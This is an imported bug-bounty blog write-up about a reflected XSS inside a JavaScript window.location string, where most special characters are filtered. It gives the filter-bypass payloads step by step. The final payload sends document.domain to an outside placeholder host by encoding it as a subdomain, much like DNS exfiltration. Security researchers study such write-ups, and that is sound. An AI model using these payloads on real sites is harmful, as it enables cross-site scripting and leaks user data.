---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-10-13_i-had-fun-with-this-xss.md
original_filename: 2020-10-13_i-had-fun-with-this-xss.md
title: I had fun with this XSS
category: documents
detected_topics:
- xss
- command-injection
- api-security
- cloud-security
tags:
- imported
- documents
- xss
- command-injection
- api-security
- cloud-security
language: en
raw_sha256: 32391dbbd732bbb3ff3332f3f171ff3ee141a187c8164414b1da19ba3d80bd13
text_sha256: 38caebc0d8ef9f9faee6e9f9d61914003acf2320f30663b77006a7619a2a401b
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: false
---

# I had fun with this XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-10-13_i-had-fun-with-this-xss.md
- Source Type: markdown
- Detected Topics: xss, command-injection, api-security, cloud-security
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: False
- Raw SHA256: `32391dbbd732bbb3ff3332f3f171ff3ee141a187c8164414b1da19ba3d80bd13`
- Text SHA256: `38caebc0d8ef9f9faee6e9f9d61914003acf2320f30663b77006a7619a2a401b`


## Content

---
title: "I had fun with this XSS"
page_title: "I had fun with this XSS  ~ Random stuff by yappare"
url: "https://blog.yappare.com/2020/10/i-had-fun-with-this-xss.html"
final_url: "https://blog.yappare.com/2020/10/i-had-fun-with-this-xss.html"
authors: ["yappare (@yappare)"]
bugs: ["XSS"]
publication_date: "2020-10-13"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4198
---

##  [I had fun with this XSS ](https://blog.yappare.com/2020/10/i-had-fun-with-this-xss.html)

on [October 13, 2020](https://blog.yappare.com/2020/10/i-had-fun-with-this-xss.html "permanent link") in [BugBounty](https://blog.yappare.com/search/label/BugBounty), [Tricks](https://blog.yappare.com/search/label/Tricks), [XSS](https://blog.yappare.com/search/label/XSS) [ No comments ](https://www.blogger.com/comment/fullpage/post/4407724975340972338/242042590765265879) [ ![](//img2.blogblog.com/img/icon18_edit_allbkg.gif) ](https://www.blogger.com/post-edit.g?blogID=4407724975340972338&postID=242042590765265879&from=pencil "Edit Post")

Recently, in a private bug-bounty program I've found an interesting XSS vulnerability where the vulnerable endpoint limits the use of special characters. The user's input got reflected in the following: 

  

  
  
  <script type="text/javascript">
  window.onload = function () {
  window.location = 'https://url/reflected-point'

  

It looks like a straightforward XSS vulnerability when it was possible to break the tag using the ' character. Generally, the following payload **'-alert(0)-'** should work, but unfortunately, the actual challenge just started.

  

I found that most of the special characters were filtered (as in removed from the content when they were inserted). After a minimal fuzzing, the following special characters were the only accepted and reflected via this endpoint:

  

  
  
  , . = : @ # ? * %
  
  
  
  
  
  
  
  

I tried to confirm if this is still possible through experimenting on JSFiddle. I noted that instead of using **-** , we can use the comma sign too when the reflection point is the same as the codes mentioned above. Means, **',alert(0),'** is actually possible.

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhLuGWugxGSJiv_g27jCpgPSu9moga3Xm8NZ34NKVOIqncf4eakj2XTTCFVwULAG_kk9N3fcCc50ujzq0yJau7mVwBKKeYitibHm94zPJ0Hna7Rat2hXCwiexCWSAH_NhDPfU9XmqEKeyQ/w640-h175/Screen+Shot+2020-10-14+at+10.15.38+AM.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhLuGWugxGSJiv_g27jCpgPSu9moga3Xm8NZ34NKVOIqncf4eakj2XTTCFVwULAG_kk9N3fcCc50ujzq0yJau7mVwBKKeYitibHm94zPJ0Hna7Rat2hXCwiexCWSAH_NhDPfU9XmqEKeyQ/s779/Screen+Shot+2020-10-14+at+10.15.38+AM.png)

  

Now, it is not done yet. Remember that parentheses are not allowed.

  

Thus, I tried to look for any ways to execute an alert box as it is an easy way to demonstrate an XSS vulnerability. However, none of the ways that seem possible using the allowed special characters in this situation..except, **location=name**

**  
**

I started focusing on that and at the same time asking ideas from people in Slack and my CTF team. I found out through JSFiddle, the following payload seems possible.

**  
**

**',document.location='javascript:document.domain','**

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjm-RG__XWCkv_sskWlbwXN8bguHJAbWVH4CC_i5GiSgK_auGtTFI-35I6PvB0qeXaqEsXpVHqv4o1Xxz6uGSyeTv27i9nMsjK4TWm9NrryVGu5tcOmyhzBTkFhky41u95mUPbecQ9NQMU/w640-h530/Screen+Shot+2020-10-14+at+10.29.09+AM.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjm-RG__XWCkv_sskWlbwXN8bguHJAbWVH4CC_i5GiSgK_auGtTFI-35I6PvB0qeXaqEsXpVHqv4o1Xxz6uGSyeTv27i9nMsjK4TWm9NrryVGu5tcOmyhzBTkFhky41u95mUPbecQ9NQMU/s769/Screen+Shot+2020-10-14+at+10.29.09+AM.png)

  

  

Done? Not yet. It was a success when I tested in the JSFiddle, but it was not when tried on the vulnerable website. This was because it will throw 500 error message when it detects if the request contains the unpermitted strings match like **javascript:document.***

 **  
**

The further test found that I can redirect the request through**window.location=http://url**. At first, it was a fail as **//** characters are not allowed. However, the request still gets redirected without the slashes. **window.location=http:url** was possible 

  

At this stage, it already enough to prove the JavaScript execution. But from the triager/customer perspective, this seems just like an open redirection vulnerability. I still need to show that it is possible to exfiltrate the content to the external domain. Easy? Yeah, the following payload should work basically..

**',window.location='http:my-url/'%2bdocument.domain%2b,'**

**  
**

But no..it was not working..since the payload contains / again. Thus, there's another bummer. Until my CTF team member,**johnburn** , told me to simply parse the content that I want as the **subdomain** instead. Similar to exfiltrating data via DNS. Honestly, I have never tried that. But..it actually works!

  

So the final payload was:

**',window.location='http:'%2bdocument.domain%2b'.my-burp-domain','**

**  
**

And of course, it got accepted :). It is always great to learn something new and share with everyone. If there's another way that should work, feel free to share it with the community.

  

**  
**

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgs_xyChlHAwSpZYQOmJWXVzGw-6n1FQBQxoEDsCIWJwDrwx-nFsQffba9khH253gy0FVxgVKN-RWEeLzNAsoTW7I4b-fB7WlLoDnNb2eiaIid0w5XJsZjLaNZ6ZRtYWDecCPG0j9vUzXE/w640-h74/Screen+Shot+2020-10-14+at+10.49.37+AM.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgs_xyChlHAwSpZYQOmJWXVzGw-6n1FQBQxoEDsCIWJwDrwx-nFsQffba9khH253gy0FVxgVKN-RWEeLzNAsoTW7I4b-fB7WlLoDnNb2eiaIid0w5XJsZjLaNZ6ZRtYWDecCPG0j9vUzXE/s386/Screen+Shot+2020-10-14+at+10.49.37+AM.png)

  
**  
**

**  
**

Share: [__](https://www.facebook.com/share.php?v=4&src=bm&u=https://blog.yappare.com/2020/10/i-had-fun-with-this-xss.html&t=I had fun with this XSS  "Share this on Facebook")[__](https://twitter.com/home?status=I had fun with this XSS  -- https://blog.yappare.com/2020/10/i-had-fun-with-this-xss.html "Tweet This!")[__](https://plus.google.com/share?url=https://blog.yappare.com/2020/10/i-had-fun-with-this-xss.html "Share this on Google+")[__](https://pinterest.com/pin/create/button/?source_url=&media=https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhLuGWugxGSJiv_g27jCpgPSu9moga3Xm8NZ34NKVOIqncf4eakj2XTTCFVwULAG_kk9N3fcCc50ujzq0yJau7mVwBKKeYitibHm94zPJ0Hna7Rat2hXCwiexCWSAH_NhDPfU9XmqEKeyQ/w640-h175/Screen+Shot+2020-10-14+at+10.15.38+AM.png&description=I had fun with this XSS  "Share on Pinterest")[__](https://www.linkedin.com/shareArticle?mini=true&title=I had fun with this XSS &url=https://blog.yappare.com/2020/10/i-had-fun-with-this-xss.html "Share this on Linkedin")

[Email This](https://www.blogger.com/share-post.g?blogID=4407724975340972338&postID=242042590765265879&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4407724975340972338&postID=242042590765265879&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4407724975340972338&postID=242042590765265879&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4407724975340972338&postID=242042590765265879&target=facebook "Share to Facebook")
